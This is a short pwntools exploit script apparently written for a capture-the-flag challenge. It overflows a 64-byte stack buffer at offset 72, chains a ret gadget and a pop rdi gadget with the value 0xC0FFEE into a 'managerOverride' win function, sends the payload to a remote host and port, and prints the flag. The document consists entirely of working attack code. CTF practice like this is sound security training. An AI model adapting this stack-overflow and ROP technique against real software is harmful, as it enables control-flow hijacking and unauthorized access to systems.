from pwn import *
import sys

context.log_level = 'error'
exe = context.binary = ELF('./chal', checksec=False)
io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) == 3 else remote('127.0.0.1', 1337)

OFFSET = 72                                  # 64-byte buf + 8 saved rbp
rop     = ROP(exe)
ret     = rop.find_gadget(['ret']).address    # align stack for libc calls
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address  # embedded gadget
win     = exe.symbols['managerOverride']
CODE    = 0xC0FFEE                           # visible in the disasm: cmp ..., 0xc0ffee

chain = flat(b'A' * OFFSET, ret, pop_rdi, CODE, win)

io.recvuntil(b'item code):')
io.sendline(chain)
io.recvuntil(b'wctf{')
sys.stdout.buffer.write(b'wctf{' + io.recvline())
